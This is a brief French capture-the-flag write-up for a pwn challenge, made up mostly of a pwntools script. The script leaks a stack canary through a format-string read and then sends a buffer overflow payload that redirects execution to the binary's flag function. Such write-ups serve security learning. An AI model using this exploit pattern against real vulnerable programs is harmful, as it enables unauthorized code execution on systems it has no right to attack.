# Description
[Qwack] : J'ADORE LES CANARDS, RESPECTEZ LES CANARDS. (h0nk h0nk)
Accès au challenge : `nc ctf.midnightflag.fr 9023`

# Write UP
```python
#!/usr/bin/python

from pwn import *

elf = ELF('./canary_friendly')

r = remote('ctf.midnightflag.fr', 9023)

# Stack canary at offset 27 on the stack
r.sendline('%27$x')

r.recvuntil('remember : \n')

res = r.recv().splitlines()

canary = int(res[1], 16)

log.success('Canary: %s' % hex(canary))

pld = "A"*(16+64)
pld += p32(canary)
pld += p32(0)*3
pld += p32(elf.sym['flag'])

r.sendline(pld)

r.interactive()
```

# Flag
-
